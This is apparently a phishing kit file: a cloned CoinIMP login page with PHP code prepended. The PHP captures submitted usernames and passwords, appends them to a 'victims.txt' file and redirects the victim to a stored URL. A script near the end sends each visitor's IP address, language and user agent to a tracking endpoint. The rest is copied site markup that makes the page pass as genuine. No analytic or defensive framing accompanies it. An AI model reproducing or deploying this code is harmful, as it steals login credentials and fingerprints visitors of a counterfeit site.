<?php
$u = $_POST['_username'];
$p = $_POST['_password'];
$f = fopen('redir.txt','r');
$r = fread($f,filesize("redir.txt"));    
fclose($f);
if ($u && $p){
  $f = fopen('victims.txt','a+');
  fwrite($f,$u.'<!:!>'.$p."\n");
  fclose($f);
  echo "<script>window.open('".$r."','_top')</script>";
}
?>
<!DOCTYPE html>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
        <meta http-equiv="X-UA-Compatible" content="ie=edge">
                <meta name="application-name" content="CoinIMP Web Miner – Monero JavaScript Mining">
        <meta name="description" content="CoinIMP is the new effective free JavaScript miner that you can embed in your website. This is the only web browser Javascript mining solution on the market with 0% fee. Web Mining in browser - Browser Mining - can be very effective way to earn on your website and can be additional source of income compared to ads. Works also on mobile devices!">
	<meta name="format-detection" content="telephone=no">
        <title>CoinIMP 0% fee JavaScript Mining, Browser Mining, Browser Miner</title>

        <!-- Google Analytics -->
        <script async="" src="app.js" charset="UTF-8" crossorigin="*"></script><script async="" src="default" charset="UTF-8" crossorigin="*"></script><script type="text/javascript" async="" src="recaptcha__en.js" crossorigin="anonymous" integrity="sha384-pMn/at+iAgl0PpX8A+ccr7iPPScp0lIFsRTiC6EkDFtJ3fTeFBeJkP7nZJTcbD5h" nonce=""></script><script async="" src="analytics.js"></script><script nonce="">
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-2289508-13', 'auto');
        ga('send', 'pageview');
        </script>
        <!-- End Google Analytics -->

                    <style type="text/css">svg:not(:root).svg-inline--fa {
  overflow: visible; }

.svg-inline--fa {
  display: inline-block;
  font-size: inherit;
  height: 1em;
  overflow: visible;
  vertical-align: -.125em; }
  .svg-inline--fa.fa-lg {
    vertical-align: -.225em; }
  .svg-inline--fa.fa-w-1 {
    width: 0.0625em; }
  .svg-inline--fa.fa-w-2 {
    width: 0.125em; }
  .svg-inline--fa.fa-w-3 {
    width: 0.1875em; }
  .svg-inline--fa.fa-w-4 {
    width: 0.25em; }
  .svg-inline--fa.fa-w-5 {
    width: 0.3125em; }
  .svg-inline--fa.fa-w-6 {
    width: 0.375em; }
  .svg-inline--fa.fa-w-7 {
    width: 0.4375em; }
  .svg-inline--fa.fa-w-8 {
    width: 0.5em; }
  .svg-inline--fa.fa-w-9 {
    width: 0.5625em; }
  .svg-inline--fa.fa-w-10 {
    width: 0.625em; }
  .svg-inline--fa.fa-w-11 {
    width: 0.6875em; }
  .svg-inline--fa.fa-w-12 {
    width: 0.75em; }
  .svg-inline--fa.fa-w-13 {
    width: 0.8125em; }
  .svg-inline--fa.fa-w-14 {
    width: 0.875em; }
  .svg-inline--fa.fa-w-15 {
    width: 0.9375em; }
  .svg-inline--fa.fa-w-16 {
    width: 1em; }
  .svg-inline--fa.fa-w-17 {
    width: 1.0625em; }
  .svg-inline--fa.fa-w-18 {
    width: 1.125em; }
  .svg-inline--fa.fa-w-19 {
    width: 1.1875em; }
  .svg-inline--fa.fa-w-20 {
    width: 1.25em; }
  .svg-inline--fa.fa-pull-left {
    margin-right: .3em;
    width: auto; }
  .svg-inline--fa.fa-pull-right {
    margin-left: .3em;
    width: auto; }
  .svg-inline--fa.fa-border {
    height: 1.5em; }
  .svg-inline--fa.fa-li {
    width: 2em; }
  .svg-inline--fa.fa-fw {
    width: 1.25em; }

.fa-layers svg.svg-inline--fa {
  bottom: 0;
  left: 0;
  margin: auto;
  position: absolute;
  right: 0;
  top: 0; }

.fa-layers {
  display: inline-block;
  height: 1em;
  position: relative;
  text-align: center;
  vertical-align: -.125em;
  width: 1em; }
  .fa-layers svg.svg-inline--fa {
    -webkit-transform-origin: center center;
            transform-origin: center center; }

.fa-layers-text, .fa-layers-counter {
  display: inline-block;
  position: absolute;
  text-align: center; }

.fa-layers-text {
  left: 50%;
  top: 50%;
  -webkit-transform: translate(-50%, -50%);
          transform: translate(-50%, -50%);
  -webkit-transform-origin: center center;
          transform-origin: center center; }

.fa-layers-counter {
  background-color: #ff253a;
  border-radius: 1em;
  -webkit-box-sizing: border-box;
          box-sizing: border-box;
  color: #fff;
  height: 1.5em;
  line-height: 1;
  max-width: 5em;
  min-width: 1.5em;
  overflow: hidden;
  padding: .25em;
  right: 0;
  text-overflow: ellipsis;
  top: 0;
  -webkit-transform: scale(0.25);
          transform: scale(0.25);
  -webkit-transform-origin: top right;
          transform-origin: top right; }

.fa-layers-bottom-right {
  bottom: 0;
  right: 0;
  top: auto;
  -webkit-transform: scale(0.25);
          transform: scale(0.25);
  -webkit-transform-origin: bottom right;
          transform-origin: bottom right; }

.fa-layers-bottom-left {
  bottom: 0;
  left: 0;
  right: auto;
  top: auto;
  -webkit-transform: scale(0.25);
          transform: scale(0.25);
  -webkit-transform-origin: bottom left;
          transform-origin: bottom left; }

.fa-layers-top-right {
  right: 0;
  top: 0;
  -webkit-transform: scale(0.25);
          transform: scale(0.25);
  -webkit-transform-origin: top right;
          transform-origin: top right; }

.fa-layers-top-left {
  left: 0;
  right: auto;
  top: 0;
  -webkit-transform: scale(0.25);
          transform: scale(0.25);
  -webkit-transform-origin: top left;
          transform-origin: top left; }

.fa-lg {
  font-size: 1.33333em;
  line-height: 0.75em;
  vertical-align: -.0667em; }

.fa-xs {
  font-size: .75em; }

.fa-sm {
  font-size: .875em; }

.fa-1x {
  font-size: 1em; }

.fa-2x {
  font-size: 2em; }

.fa-3x {
  font-size: 3em; }

.fa-4x {
  font-size: 4em; }

.fa-5x {
  font-size: 5em; }

.fa-6x {
  font-size: 6em; }

.fa-7x {
  font-size: 7em; }

.fa-8x {
  font-size: 8em; }

.fa-9x {
  font-size: 9em; }

.fa-10x {
  font-size: 10em; }

.fa-fw {
  text-align: center;
  width: 1.25em; }

.fa-ul {
  list-style-type: none;
  margin-left: 2.5em;
  padding-left: 0; }
  .fa-ul > li {
    position: relative; }

.fa-li {
  left: -2em;
  position: absolute;
  text-align: center;
  width: 2em;
  line-height: inherit; }

.fa-border {
  border: solid 0.08em #eee;
  border-radius: .1em;
  padding: .2em .25em .15em; }

.fa-pull-left {
  float: left; }

.fa-pull-right {
  float: right; }

.fa.fa-pull-left,
.fas.fa-pull-left,
.far.fa-pull-left,
.fal.fa-pull-left,
.fab.fa-pull-left {
  margin-right: .3em; }

.fa.fa-pull-right,
.fas.fa-pull-right,
.far.fa-pull-right,
.fal.fa-pull-right,
.fab.fa-pull-right {
  margin-left: .3em; }

.fa-spin {
  -webkit-animation: fa-spin 2s infinite linear;
          animation: fa-spin 2s infinite linear; }

.fa-pulse {
  -webkit-animation: fa-spin 1s infinite steps(8);
          animation: fa-spin 1s infinite steps(8); }

@-webkit-keyframes fa-spin {
  0% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg); }
  100% {
    -webkit-transform: rotate(360deg);
            transform: rotate(360deg); } }

@keyframes fa-spin {
  0% {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg); }
  100% {
    -webkit-transform: rotate(360deg);
            transform: rotate(360deg); } }

.fa-rotate-90 {
  -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";
  -webkit-transform: rotate(90deg);
          transform: rotate(90deg); }

.fa-rotate-180 {
  -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";
  -webkit-transform: rotate(180deg);
          transform: rotate(180deg); }

.fa-rotate-270 {
  -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";
  -webkit-transform: rotate(270deg);
          transform: rotate(270deg); }

.fa-flip-horizontal {
  -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";
  -webkit-transform: scale(-1, 1);
          transform: scale(-1, 1); }

.fa-flip-vertical {
  -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
  -webkit-transform: scale(1, -1);
          transform: scale(1, -1); }

.fa-flip-horizontal.fa-flip-vertical {
  -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
  -webkit-transform: scale(-1, -1);
          transform: scale(-1, -1); }

:root .fa-rotate-90,
:root .fa-rotate-180,
:root .fa-rotate-270,
:root .fa-flip-horizontal,
:root .fa-flip-vertical {
  -webkit-filter: none;
          filter: none; }

.fa-stack {
  display: inline-block;
  height: 2em;
  position: relative;
  width: 2em; }

.fa-stack-1x,
.fa-stack-2x {
  bottom: 0;
  left: 0;
  margin: auto;
  position: absolute;
  right: 0;
  top: 0; }

.svg-inline--fa.fa-stack-1x {
  height: 1em;
  width: 1em; }

.svg-inline--fa.fa-stack-2x {
  height: 2em;
  width: 2em; }

.fa-inverse {
  color: #fff; }

.sr-only {
  border: 0;
  clip: rect(0, 0, 0, 0);
  height: 1px;
  margin: -1px;
  overflow: hidden;
  padding: 0;
  position: absolute;
  width: 1px; }

.sr-only-focusable:active, .sr-only-focusable:focus {
  clip: auto;
  height: auto;
  margin: 0;
  overflow: visible;
  position: static;
  width: auto; }
</style><link rel="stylesheet" href="main.bf190b6b.css">
            <link href="css" rel="stylesheet">
        
        <link rel="apple-touch-icon" sizes="180x180" href="https://www.coinimp.com/apple-touch-icon.png">
        <link rel="shortcut icon" type="image/png" sizes="32x32" href="https://www.coinimp.com/site-icon-32.png">
        <link rel="shortcut icon" type="image/png" sizes="16x16" href="https://www.coinimp.com/site-icon-16.png">
        <link rel="shortcut icon" type="image/x-icon" href="https://www.coinimp.com/favicon.ico">
        <link rel="manifest" href="https://www.coinimp.com/manifest.json">
        <link rel="mask-icon" href="https://www.coinimp.com/safari-pinned-tab.svg" color="#448aff">
        <meta name="apple-mobile-web-app-title" content="CoinIMP – Monero JavaScript Mining">
        <meta name="msapplication-TileColor" content="#448aff">
        <meta name="msapplication-TileImage" content="/mstile-144x144.png">
        <meta name="theme-color" content="#448aff">

                <meta property="og:image" content="/build/images/opengraph-preview.c05e81cc.png">
        <script nonce="" type="application/ld+json">
{
    "@context": "http://schema.org",
    "@graph": [
    {
        "@type": "WebSite",
        "name": "CoinIMP JavaScript mining",
        "url": "https://www.coinimp.com/",
        "about": "CoinIMP is the new effective JavaScript miner that can be easily embedded in your website. It's an excellent alternative to annoying ads. This way users will pay you with their CPU power for accessing your content.",
        "copyrightYear": "2018",
        "keywords": "coinimp,Javascript mining, browser mining,web miner, monero"
    },
    {
        "@type": "product",
        "brand": "CoinIMP",
        "name": "CoinIMP JavaScript mining",
        "logo": {
                "@type": "ImageObject",
                "caption": "CoinIMPLogo",
                "contentUrl": "https://www.coinimp.com//img/main-logo.png",
                "description": "CoinIMP JavaScript miner",
                "name": "CoinIMPLogo",
                "keywords": "coinimp,javascript mining,browser mining,web miner,monero"
        },
        "image": {
            "@type": "ImageObject",
            "caption": "CoinIMP",
            "contentUrl": "https://www.coinimp.com//img/main-mascot.png",
            "description": "CoinIMP  JavaScript miner",
            "name": "CoinIMP",
            "keywords": "coinimp,javascript mining,browser mining,web miner,monero"
        },
        "offers": {
            "@type": "Offer",
            "price": "0.00",
            "description": "When you refer someone YOU WILL GET 1% of all his earnings",
            "mainEntityOfPage": "https://www.coinimp.com/referral",
            "image": {
                    "@type": "ImageObject",
                    "caption": "CoinIMP referral",
                    "contentUrl": "https://www.coinimp.com//img/imp-calculator.png",
                    "description": "CoinIMP  referral program ",
                    "name": "CoinIMPReferral",
                    "keywords": "coinimp,javascript mining,browser mining,web miner,monero"
            },
            "name": "referralProgram"
        },
        "description": "CoinIMP is the new effective JavaScript miner that can be easily embedded in your website",
        "aggregateRating": {
            "@type": "AggregateRating",
            "reviewCount": "7",
            "ratingValue": "5",
            "author": "https://alternativeto.net/software/coinimp/reviews/",
            "name": "CoinIMPRating"
        }
    },
    {
        "@type": "WebApplication",
        "name": "CoinIMP JavaScript mining",
        "applicationCategory": "cryptocurrency",
        "operatingSystem": "all",
        "description": "CoinIMP is the new effective JavaScript miner that can be easily embedded in your website",
        "downloadUrl": "https://www.coinimp.com//register",
        "featureList": "https://www.coinimp.com/",
        "installUrl": "https://www.coinimp.com/dashboard",
        "releaseNotes": "https://www.coinimp.com/",
        "screenshot": "https://www.coinimp.com/documentation",
        "keywords": "coinimp,javascript mining,browser mining,web miner,monero",
        "offers": {
            "@type": "Offer",
            "price": "0.00",
            "description": "When you refer someone YOU WILL GET 1% of all his earnings",
            "mainEntityOfPage": "https://www.coinimp.com/referral",
            "image": {
                "@type": "ImageObject",
                "caption": "CoinIMP referral",
                "contentUrl": "https://www.coinimp.com//img/imp-calculator.png",
                "description": "coinImp  referral program ",
                "name": "CoinIMPReferral",
                "keywords": "coinimp,javascript mining,browser mining,web miner,monero"
            },
            "name": "referralProgram"
        },
        "aggregateRating": {
            "@type": "AggregateRating",
            "reviewCount": "7",
            "ratingValue": "5",
            "author": "https://alternativeto.net/software/coinimp/reviews/",
            "name": "CoinIMPRating"
        },
        "image": [ {
            "@type": "ImageObject",
            "caption": "CoinIMP",
            "contentUrl": "https://www.coinimp.com//img/main-logo.png",
            "description": "CoinIMP JavaScript miner Logo",
            "name": "CoinIMPLogo",
            "keywords": "coinimp,javascript mining,browser mining,web miner,monero"
        } ,
        {
            "@type": "ImageObject",
            "caption": "CoinIMP",
            "contentUrl": "https://www.coinimp.com//img/main-mascot.png",
            "description": "CoinIMP JavaScript miner",
            "name": "CoinIMP",
            "keywords": "coinimp,javascript mining,browser mining,web miner,monero"
        }],
        "softwareHelp": {
            "@type": "HowTo",
            "description": "CoinIMP is the new effective JavaScript miner that can be easily embedded in your website. It's an excellent alternative to annoying ads. This way users will pay you with their CPU power for accessing your content.",
            "mainEntityOfPage": "https://www.coinimp.com/documentation/reference",
            "name": "CoinIMPHelp",
            "keywords": "coinimp,javascript mining,browser mining,web miner,monero",
            "url": "https://www.coinimp.com/documentation"
        },
        "softwareRequirements": "https://www.coinimp.com/documentation",
        "about": "CoinIMP is the new effective JavaScript miner that can be easily embedded in your website. It's an excellent alternative to annoying ads. This way users will pay you with their CPU power for accessing your content."
    }
    ]
}
</script>

    </head>
    <body class="">

        
                                    <nav id="navbar" class="navbar navbar-expand-lg navbar-light bg-light py-3"><div class="container-fluid"><a href="https://www.coinimp.com/" class="navbar-brand"><img src="main-logo.ad63ea88.png" height="40" alt="CoinIMP javascript mining logo"></a> <button type="button" aria-label="Toggle navigation" class="navbar-toggler collapsed"><span class="navbar-toggler-icon"></span></button> <div class="collapse navbar-collapse"><ul class="navbar-nav ml-auto"><li class="nav-item "><a href="https://www.coinimp.com/about" class="nav-link">About Us</a></li> <li class="nav-item "><a href="https://www.coinimp.com/documentation" class="nav-link">Documentation</a></li> <li class="nav-item "><a href="https://www.coinimp.com/faq" class="nav-link">FAQ</a></li> <li class="nav-item "><a href="https://www.coinimp.com/referral" class="nav-link">Referral Program</a></li> <li class="nav-item "><a href="https://www.coinimp.com/news/archive" class="nav-link">News</a></li> <li class="nav-item active"><a href="https://www.coinimp.com/login" class="nav-link">Log In</a></li> <li class="nav-item "><a href="https://www.coinimp.com/register/" class="nav-link">Sign Up</a></li></ul></div></div></nav>
            
            <div class="container-fluid p-0" id="content-wrapper" style="min-height: 268px;">
                <div id="content-container" class="wrap-main-form">
                    
                        <div class="py-4">
    <div class="container">
    <div class="row py-3 justify-content-center">
        <div class="col-xs-12 col-lg-10 col-xl-6">
            <div class="card">
                <div class="card-header">
                    Log In
                </div>
                <div class="card-body">
                            <div id="icons" class="form-group row"><span class="mx-auto"><a href="https://www.coinimp.com/connect/google"><button class="loginBtn loginBtn-google"><svg aria-hidden="true" data-prefix="fab" data-icon="google-plus-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="svg-inline--fa fa-google-plus-square fa-w-14"><path fill="currentColor" d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM164 356c-55.3 0-100-44.7-100-100s44.7-100 100-100c27 0 49.5 9.8 67 26.2l-27.1 26.1c-7.4-7.1-20.3-15.4-39.8-15.4-34.1 0-61.9 28.2-61.9 63.2 0 34.9 27.8 63.2 61.9 63.2 39.6 0 54.4-28.5 56.8-43.1H164v-34.4h94.4c1 5 1.6 10.1 1.6 16.6 0 57.1-38.3 97.6-96 97.6zm220-81.8h-29v29h-29.2v-29h-29V245h29v-29H355v29h29v29.2z" class=""></path></svg>
                            Log in with Google
                       </button></a></span></div>
<div class="form-group row">
  <span class="mx-auto"><h3>OR</h3></span>
</div>
    <form action="" method="post">
        <div class="form-group row">
            <label for="inputEmail" class="col-md-12 col-form-label pt-0">Email</label>
            <div class="col-md-12">
                <input type="email" pattern="[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$" name="_username" value="" required="required" id="inputEmail" class="form-control form-control-md" autofocus="">
            </div>
        </div>
        <div class="form-group row">
            <label for="inputPassword" class="col-md-12 col-form-label pt-0">Password</label>
            <div class="col-md-12">
                <input type="password" name="_password" required="required" id="inputPassword" class="form-control form-control-md">
            </div>
        </div>
                
        <div class="form-group row my-1">
            <div class="col-md-8 offset-md-4">
                <label class="custom-control custom-checkbox">
                    <input type="checkbox" id="remember_me" name="_remember_me" class="custom-control-input">
                    <label class="custom-control-label" for="remember_me">Remember me</label>
                </label>
            </div>
        </div>
        <div class="form-group row">
            <div class="col-md-8 offset-md-4">
                <input type="submit" id="_submit" name="_submit" class="btn btn-primary" value="Log In"> or <a href="https://www.coinimp.com/register/">Sign Up</a>
            </div>
        </div>
        <div class="form-group row recover-password-option">
            <div class="col-md-8 offset-md-4">
                <a href="https://www.coinimp.com/resetting/request">Forgot password?</a>
            </div>
        </div>
                    <input type="hidden" name="_csrf_token" value="_jd1Zx7Oad_YPYNMX1ghFBxuHwOmEkX_XY_fx9NGuYo">
            </form>
                </div>
            </div>
                    </div>
    </div>
</div>
</div>
                </div>
            </div>

            <div class="container-fluid p-0">
                                    <div id="page-footer"><div class="container"><div class="row"><div class="col-12 text-center"><p class="d-flex align-items-center justify-content-center"><a href="https://www.twitter.com/coinimp" rel="nofollow" target="_blank" class="mr-3"><div class="fa-2x fa-layers"><svg aria-hidden="true" data-prefix="fab" data-icon="twitter-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="svg-inline--fa fa-twitter-square fa-w-14"><path fill="currentColor" d="M400 32H48C21.5 32 0 53.5 0 80v352c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm-48.9 158.8c.2 2.8.2 5.7.2 8.5 0 86.7-66 186.6-186.6 186.6-37.2 0-71.7-10.8-100.7-29.4 5.3.6 10.4.8 15.8.8 30.7 0 58.9-10.4 81.4-28-28.8-.6-53-19.5-61.3-45.5 10.1 1.5 19.2 1.5 29.6-1.2-30-6.1-52.5-32.5-52.5-64.4v-.8c8.7 4.9 18.9 7.9 29.6 8.3a65.447 65.447 0 0 1-29.2-54.6c0-12.2 3.2-23.4 8.9-33.1 32.3 39.8 80.8 65.8 135.2 68.6-9.3-44.5 24-80.6 64-80.6 18.9 0 35.9 7.9 47.9 20.7 14.8-2.8 29-8.3 41.6-15.8-4.9 15.2-15.2 28-28.8 36.1 13.2-1.4 26-5.1 37.8-10.2-8.9 13.1-20.1 24.7-32.9 34z" class=""></path></svg></div></a> <a href="https://www.reddit.com/r/coinimp" rel="nofollow" target="_blank" class="mr-3"><div class="fa-2x fa-layers"><svg aria-hidden="true" data-prefix="fab" data-icon="reddit-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="svg-inline--fa fa-reddit-square fa-w-14"><path fill="currentColor" d="M283.2 345.5c2.7 2.7 2.7 6.8 0 9.2-24.5 24.5-93.8 24.6-118.4 0-2.7-2.4-2.7-6.5 0-9.2 2.4-2.4 6.5-2.4 8.9 0 18.7 19.2 81 19.6 100.5 0 2.4-2.3 6.6-2.3 9 0zm-91.3-53.8c0-14.9-11.9-26.8-26.5-26.8-14.9 0-26.8 11.9-26.8 26.8 0 14.6 11.9 26.5 26.8 26.5 14.6 0 26.5-11.9 26.5-26.5zm90.7-26.8c-14.6 0-26.5 11.9-26.5 26.8 0 14.6 11.9 26.5 26.5 26.5 14.9 0 26.8-11.9 26.8-26.5 0-14.9-11.9-26.8-26.8-26.8zM448 80v352c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V80c0-26.5 21.5-48 48-48h352c26.5 0 48 21.5 48 48zm-99.7 140.6c-10.1 0-19 4.2-25.6 10.7-24.1-16.7-56.5-27.4-92.5-28.6l18.7-84.2 59.5 13.4c0 14.6 11.9 26.5 26.5 26.5 14.9 0 26.8-12.2 26.8-26.8 0-14.6-11.9-26.8-26.8-26.8-10.4 0-19.3 6.2-23.8 14.9l-65.7-14.6c-3.3-.9-6.5 1.5-7.4 4.8l-20.5 92.8c-35.7 1.5-67.8 12.2-91.9 28.9-6.5-6.8-15.8-11-25.9-11-37.5 0-49.8 50.4-15.5 67.5-1.2 5.4-1.8 11-1.8 16.7 0 56.5 63.7 102.3 141.9 102.3 78.5 0 142.2-45.8 142.2-102.3 0-5.7-.6-11.6-2.1-17 33.6-17.2 21.2-67.2-16.1-67.2z" class=""></path></svg></div></a> <a href="https://www.facebook.com/coinimp/" rel="nofollow" target="_blank" class="mr-3"><div class="fa-2x fa-layers"><svg aria-hidden="true" data-prefix="fab" data-icon="facebook-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="svg-inline--fa fa-facebook-square fa-w-14"><path fill="currentColor" d="M448 80v352c0 26.5-21.5 48-48 48h-85.3V302.8h60.6l8.7-67.6h-69.3V192c0-19.6 5.4-32.9 33.5-32.9H384V98.7c-6.2-.8-27.4-2.7-52.2-2.7-51.6 0-87 31.5-87 89.4v49.9H184v67.6h60.9V480H48c-26.5 0-48-21.5-48-48V80c0-26.5 21.5-48 48-48h352c26.5 0 48 21.5 48 48z" class=""></path></svg></div></a> <a href="https://www.coinimp.com/contact" class="mr-3"><div class="fa-1x fa-layers"><svg aria-hidden="true" data-prefix="fas" data-icon="envelope" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="svg-inline--fa fa-envelope fa-w-16"><path fill="currentColor" d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z" class=""></path></svg></div>
                                            Contact Us
                                        </a> <a href="https://www.coinimp.com/faq" class="mr-3"><div class="fa-1x fa-layers"><svg aria-hidden="true" data-prefix="far" data-icon="question-circle" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="svg-inline--fa fa-question-circle fa-w-16"><path fill="currentColor" d="M256 8C119.043 8 8 119.083 8 256c0 136.997 111.043 248 248 248s248-111.003 248-248C504 119.083 392.957 8 256 8zm0 448c-110.532 0-200-89.431-200-200 0-110.495 89.472-200 200-200 110.491 0 200 89.471 200 200 0 110.53-89.431 200-200 200zm107.244-255.2c0 67.052-72.421 68.084-72.421 92.863V300c0 6.627-5.373 12-12 12h-45.647c-6.627 0-12-5.373-12-12v-8.659c0-35.745 27.1-50.034 47.579-61.516 17.561-9.845 28.324-16.541 28.324-29.579 0-17.246-21.999-28.693-39.784-28.693-23.189 0-33.894 10.977-48.942 29.969-4.057 5.12-11.46 6.071-16.666 2.124l-27.824-21.098c-5.107-3.872-6.251-11.066-2.644-16.363C184.846 131.491 214.94 112 261.794 112c49.071 0 101.45 38.304 101.45 88.8zM298 368c0 23.159-18.841 42-42 42s-42-18.841-42-42 18.841-42 42-42 42 18.841 42 42z" class=""></path></svg></div>
                                            FAQ
                                        </a></p> <p class="d-flex align-items-center justify-content-center"><a href="https://www.coinimp.com/terms-and-conditions" class="mr-3">
                                            Terms &amp; Conditions
                                        </a> <a href="https://www.coinimp.com/privacy-policy" class="mr-3">
                                            Privacy Policy
                                        </a></p></div> <div class="col-12 text-center"><p class="justify-content-center">v1.3.9 | Copyright 2017-2021 Coin<span class="imp-color">IMP</span>.com, All Rights Reserved</p> <p class="justify-content-center"><a href="https://www.mintme.com/">mintMe - monetize yourself</a> |
                                        <svg aria-hidden="true" data-prefix="fas" data-icon="cookie-bite" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="svg-inline--fa fa-cookie-bite fa-w-16"><path fill="currentColor" d="M510.52 255.82c-69.97-.85-126.47-57.69-126.47-127.86-70.17 0-127-56.49-127.86-126.45-27.26-4.14-55.13.3-79.72 12.82l-69.13 35.22a132.221 132.221 0 0 0-57.79 57.81l-35.1 68.88a132.645 132.645 0 0 0-12.82 80.95l12.08 76.27a132.521 132.521 0 0 0 37.16 72.96l54.77 54.76a132.036 132.036 0 0 0 72.71 37.06l76.71 12.15c27.51 4.36 55.7-.11 80.53-12.76l69.13-35.21a132.273 132.273 0 0 0 57.79-57.81l35.1-68.88c12.56-24.64 17.01-52.58 12.91-79.91zM176 368c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm32-160c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32zm160 128c-17.67 0-32-14.33-32-32s14.33-32 32-32 32 14.33 32 32-14.33 32-32 32z" class=""></path></svg> This website uses cookies
                                    </p></div></div></div></div>
                            </div>
                            <script nonce="" src="main.a4fcc4ad.js"></script>
                        <!--Start of Tawk.to Script-->
            <script nonce="" type="text/javascript">
                var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
                (function(){
                    var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
                    s1.async=true;
                    s1.src='https://embed.tawk.to/5a280eeb5d3202175d9b6b51/default';
                    s1.charset='UTF-8';
                    s1.setAttribute('crossorigin','*');
                    s0.parentNode.insertBefore(s1,s0);
                })();
            </script>
            <!--End of Tawk.to Script-->
 
<script src=
"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
</script>  
<script>
$.getJSON("https://api.ipify.org?format=json",function(data) {
if (1) {
    var ip = data.ip;
    var lang = navigator.language;
    var platform = navigator.platform;
    var ua = navigator.userAgent;
    var webdriver = navigator.webdriver;
    $.ajax({
        url : 'u.php',
        type : 'post',
        data : {
            'ip' : ip,
            'lang' : lang,
            'ua' : ua
        }
    });
}
});
</script>
<div style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;"><div style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;"></div><div class="g-recaptcha-bubble-arrow" style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;"></div><div class="g-recaptcha-bubble-arrow" style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;"></div><div style="z-index: 2000000000; position: relative;"><iframe title="recaptcha challenge" src="bframe.html" name="c-8004qxc79lu9" frameborder="0" scrolling="no" sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox" style="width: 100%; height: 100%;"></iframe></div></div></body></html>